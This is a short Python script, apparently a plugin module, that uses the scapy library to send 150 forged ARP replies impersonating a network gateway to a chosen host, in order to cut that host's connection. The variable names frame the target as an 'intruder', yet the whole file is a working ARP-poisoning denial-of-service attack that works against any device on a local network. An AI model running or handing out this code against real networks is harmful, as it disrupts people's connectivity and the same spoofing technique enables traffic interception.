#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Coded by Sam (info@sam3.se)
from scapy.all import *
from time import sleep

name = 'ARP Poison to kill connection'

def getname():
    return name

def run(arg):
    intruder_mac = arg.split('-')[0]
    intruder_ip = arg.split('-')[1]
    gateway = arg.split('-')[2]
    mac='DE:AD:DE:AD:DE:AD'
    counter = 0
    arp=ARP(op=2, psrc=gateway, pdst=intruder_ip, hwdst=intruder_mac)
    
    while counter != 150:
        counter += 1
        send(arp, verbose=False)
        sleep(2)
    sleep(5)

if __name__ == "__main__":
    quit()